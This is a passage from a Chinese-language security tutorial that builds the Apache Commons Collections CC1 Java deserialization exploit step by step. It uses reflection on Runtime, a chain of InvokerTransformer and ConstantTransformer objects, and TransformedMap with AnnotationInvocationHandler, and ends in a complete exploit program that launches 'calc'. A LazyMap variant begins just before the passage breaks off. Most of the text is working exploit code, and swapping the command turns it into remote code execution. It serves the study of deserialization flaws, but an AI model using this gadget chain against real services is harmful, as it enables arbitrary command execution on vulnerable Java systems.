        <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">annotationInvocationhdlConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Override</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">transformedmap</span><span class="o">);</span>
        <span class="n">serialize</span><span class="o">(</span><span class="n">o</span><span class="o">);</span>
        <span class="n">unserialize</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">);</span>
    <span class="o">}</span>


    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">serialize</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">));</span>
        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">unserialize</span><span class="o">(</span><span class="n">String</span> <span class="n">Filename</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span><span class="n">ClassNotFoundException</span><span class="o">{</span>
        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="n">Filename</span><span class="o">));</span>
        <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
        <span class="k">return</span> <span class="n">obj</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<h3 data-content="1" id="bdb8801b95cdaab89e52853bc4a22784">EXP问题：</h3>
<h4 data-content="1" id="b597faf3e6a225a3a998d27d13a4b8e9">
<code>Runtime</code>类不可实例化：</h4>
<p>我们可以看到整条链子我们已经顺下来了，但是我们最后传入的r = Runtime.getRuntime()并没有serializable接口，不能够序列化，所以这里我们要进行反射调用，从Runtime的class属性入手进行反射</p>
<div class="highlight"><pre><span></span><span class="n">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">;</span>
<span class="n">Method</span> <span class="n">getRuntimeMethod</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"getRuntime"</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>
<span class="n">Runtime</span> <span class="n">r</span> <span class="o">=</span> <span class="o">(</span><span class="n">Runtime</span><span class="o">)</span> <span class="n">getRuntimeMethod</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>
<span class="n">Method</span> <span class="n">execMethod</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
<span class="n">execMethod</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">r</span><span class="o">,</span><span class="s">"calc"</span><span class="o">);</span>
</pre></div>
<p>然后我们来转化一下，用<code>InvokerTransformer</code>类中的<code>transform</code>方法来进行构造：</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">Object</span> <span class="nf">transform</span><span class="o">(</span><span class="n">Object</span> <span class="n">input</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">input</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">Class</span> <span class="n">cls</span> <span class="o">=</span> <span class="n">input</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
            <span class="n">Method</span> <span class="n">method</span> <span class="o">=</span> <span class="n">cls</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="n">iMethodName</span><span class="o">,</span> <span class="n">iParamTypes</span><span class="o">);</span>
            <span class="k">return</span> <span class="n">method</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">input</span><span class="o">,</span> <span class="n">iArgs</span><span class="o">);</span>

        <span class="o">}</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="n">Method</span> <span class="n">getRuntimeMethod</span> <span class="o">=</span> <span class="o">(</span><span class="n">Method</span><span class="o">)</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"getMethod"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span><span class="kc">null</span><span class="o">}).</span><span class="na">transform</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">);</span><span class="c1">//获取Runtime.getRuntime方法</span>

<span class="n">Runtime</span> <span class="n">r</span> <span class="o">=</span> <span class="o">(</span><span class="n">Runtime</span><span class="o">)</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"invoke"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{}).</span><span class="na">transform</span><span class="o">(</span><span class="n">getRuntimeMethod</span><span class="o">);</span><span class="c1">//调用Runtime.getRuntime方法从而实例化Runtime类</span>

<span class="n">InvokerTransformer</span> <span class="n">invokerTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"calc"</span><span class="o">});</span><span class="c1">//</span>
<span class="n">invokerTransformer</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">r</span><span class="o">);</span>
</pre></div>
<p>然后我们还可以调用链式结构来优化这个代码：</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="nf">ChainedTransformer</span><span class="o">(</span><span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span><span class="o">)</span> <span class="o">{</span>
        <span class="kd">super</span><span class="o">();</span>
        <span class="n">iTransformers</span> <span class="o">=</span> <span class="n">transformers</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="cm">/**</span>
<span class="cm">     * Transforms the input to result via each decorated transformer</span>
<span class="cm">     * </span>
<span class="cm">     * @param object  the input object passed to the first transformer</span>
<span class="cm">     * @return the transformed result</span>
<span class="cm">     */</span>
    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">transform</span><span class="o">(</span><span class="n">Object</span> <span class="n">object</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">iTransformers</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
            <span class="n">object</span> <span class="o">=</span> <span class="n">iTransformers</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">transform</span><span class="o">(</span><span class="n">object</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="n">object</span><span class="o">;</span>
    <span class="o">}</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"getMethod"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"invoke"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{}),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"calc"</span><span class="o">})</span>
        <span class="o">};</span>
<span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
<span class="n">chainedTransformer</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</pre></div>
<h4 data-content="1" id="2c279718447625330501dece25524b74">
<code>if</code>判断进入<code>setValue</code>：</h4>
<p>我们在<code>AnnotationvocationHandler</code>类中的<code>if</code>下断点，我们可以发现memberType在这里识别为null，我们就无法进入<code>if</code>语句从而导致无法调用setValue方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235121-f290ced6-20cb-1.png"/></p>
<p>我们可以看一下调试的结果：</p>
<div class="highlight"><pre><span></span><span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="n">memberValue</span><span class="o">.</span><span class="na">getKey</span><span class="o">();</span>
<span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">memberType</span> <span class="o">=</span> <span class="n">memberTypes</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
</pre></div>
<p>通过查找memberValue里面，先获取他的键值，对应的就是transformedmap里面对应的map，然后再用map中的key当作name查找对应memberType里面的函数名。</p>
<div class="highlight"><pre><span></span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span><span class="c1">//new一个map</span>
<span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"key"</span><span class="o">,</span><span class="s">"value"</span><span class="o">);</span><span class="c1">//对map进行赋值</span>
<span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">transformedmap</span> <span class="o">=</span> <span class="n">TransformedMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="kc">null</span><span class="o">,</span><span class="n">invokerTransformer</span><span class="o">);</span>
</pre></div>
<p>所以这里我们就要找到一个有函数名的注释类，然后将map中的key改成对应的函数名称：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235130-f7c98618-20cb-1.png"/></p>
<div class="highlight"><pre><span></span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"value"</span><span class="o">,</span><span class="s">"aaa"</span><span class="o">);</span>
        <span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">transformedmap</span> <span class="o">=</span> <span class="n">TransformedMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="kc">null</span><span class="o">,</span><span class="n">chainedTransformer</span><span class="o">);</span>

        <span class="n">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">);</span>
        <span class="n">Constructor</span> <span class="n">annotationInvocationhdlConstructor</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">annotationInvocationhdlConstructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">annotationInvocationhdlConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Target</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">transformedmap</span><span class="o">);</span>
        <span class="n">serialize</span><span class="o">(</span><span class="n">o</span><span class="o">);</span>
        <span class="n">unserialize</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">);</span>
</pre></div>
<p>再进行一次调试我们就发现能够进入if语句了：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235136-fbab84d4-20cb-1.png"/></p>
<h4 data-content="1" id="9f3a2c7f26382ce5f63e9aeaaa3f92a5">
<code>transform</code>中value设置:</h4>
<p>我们发现setValue里面并不是我们想要传的值</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235141-fe79957a-20cb-1.png"/></p>
<p>我们步入看一下最后value对应的什么值：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235148-02905f22-20cc-1.png"/></p>
<p>所以这里需要修改这个值：</p>
<p>这里我们调用这个地方我们可以发现，不管最后transform是什么值，都会返回对应的constant值，所以我们就可以把Runtime设为这个固定值。</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="nf">ConstantTransformer</span><span class="o">(</span><span class="n">Object</span> <span class="n">constantToReturn</span><span class="o">)</span> <span class="o">{</span>
        <span class="kd">super</span><span class="o">();</span>
        <span class="n">iConstant</span> <span class="o">=</span> <span class="n">constantToReturn</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">transform</span><span class="o">(</span><span class="n">Object</span> <span class="n">input</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">iConstant</span><span class="o">;</span>
    <span class="o">}</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"getMethod"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"invoke"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{}),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"calc"</span><span class="o">})</span>
        <span class="o">};</span>
        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
</pre></div>
<p>这样我们最后的value就固定为Runtime.class了</p>
<h3 data-content="1" id="157ea1c30b7d39602e0e724af8e90632">EXP(CC1Transformedmap)：</h3>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">exp</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.annotation.Target</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Constructor</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC1Test</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>


<span class="c1">//        Runtime r = Runtime.getRuntime();//单例模式，通过对应方法创建对象//问题一：r不能序列化，没有继承序列化接口</span>
<span class="c1">//        Class c = Runtime.class;</span>
<span class="c1">//        Method execMethod = c.getMethod("exec",String.class);</span>
<span class="c1">//        execMethod.invoke(r,"calc");</span>


<span class="c1">//        Class c = Runtime.class;</span>
<span class="c1">//        Method getRuntimeMethod = c.getMethod("getRuntime",null);</span>
<span class="c1">//        Runtime r = (Runtime) getRuntimeMethod.invoke(null,null);</span>
<span class="c1">//        Method execMethod = c.getMethod("exec", String.class);</span>
<span class="c1">//        execMethod.invoke(r,"calc");</span>



<span class="c1">//        Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);</span>
<span class="c1">//        Runtime r = (Runtime) new InvokerTransformer("invoke",new Class[]{Object.class,Object.class},new Object[]{}).transform(getRuntimeMethod);</span>
<span class="c1">//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});</span>

        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">Transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"getMethod"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"invoke"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"calc"</span><span class="o">})</span>
        <span class="o">};</span>
        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">Transformers</span><span class="o">);</span>


<span class="c1">//        chainedTransformer.transform(Runtime.class);</span>

<span class="c1">//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});</span>

        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"value"</span><span class="o">,</span><span class="s">"aaa"</span><span class="o">);</span>
        <span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">transformedmap</span> <span class="o">=</span> <span class="n">TransformedMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="kc">null</span><span class="o">,</span><span class="n">chainedTransformer</span><span class="o">);</span>




        <span class="n">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">);</span>
        <span class="n">Constructor</span> <span class="n">annotationInvocationhdlConstructor</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">annotationInvocationhdlConstructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">annotationInvocationhdlConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Target</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">transformedmap</span><span class="o">);</span>


        <span class="n">serialize</span><span class="o">(</span><span class="n">o</span><span class="o">);</span>
        <span class="n">unserialize</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">);</span>
    <span class="o">}</span>


    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">serialize</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">));</span>
        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
    <span class="o">}</span>


    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">unserialize</span><span class="o">(</span><span class="n">String</span> <span class="n">Filename</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span><span class="n">ClassNotFoundException</span><span class="o">{</span>
        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="n">Filename</span><span class="o">));</span>
        <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
        <span class="k">return</span> <span class="n">obj</span><span class="o">;</span>
    <span class="o">}</span>

<span class="o">}</span>
</pre></div>
<h3 data-content="1" id="4d12c5df0105b695de327d505fe927d1">EXP(CC1LazyMap):</h3>
<p>在调用<code>tranforms</code>方法时候，除了能利用<code>Transformedmap</code>来进行调用，还可以通过使用<code>Lazymap</code>中的get方法来进行调用，然后再从<code>annotationInvocationHandler</code>的<code>invoke</code>方法中调用<code>Lazymap</code>中的<code>get</code>方法，再通过<code>readObject</code>里面调用代理类代理触发<code>annotationInvocation</code>类中的<code>invoke</code>方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235204-0c0f8ce4-20cc-1.png"/></p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">exp</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.annotation.Target</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Constructor</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationHandler</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Proxy</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC1Test</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>


<span class="c1">//        Runtime r = Runtime.getRuntime();//单例模式，通过对应方法创建对象//问题一：r不能序列化，没有继承序列化接口</span>
<span class="c1">//        Class c = Runtime.class;</span>
<span class="c1">//        Method execMethod = c.getMethod("exec",String.class);</span>
<span class="c1">//        execMethod.invoke(r,"calc");</span>


<span class="c1">//        Class c = Runtime.class;</span>
<span class="c1">//        Method getRuntimeMethod = c.getMethod("getRuntime",null);</span>
<span class="c1">//        Runtime r = (Runtime) getRuntimeMethod.invoke(null,null);</span>
<span class="c1">//        Method execMethod = c.getMethod("exec", String.class);</span>
<span class="c1">//        execMethod.invoke(r,"calc");</span>



<span class="c1">//        Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);</span>
<span class="c1">//        Runtime r = (Runtime) new InvokerTransformer("invoke",new Class[]{Object.class,Object.class},new Object[]{}).transform(getRuntimeMethod);</span>
<span class="c1">//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});</span>

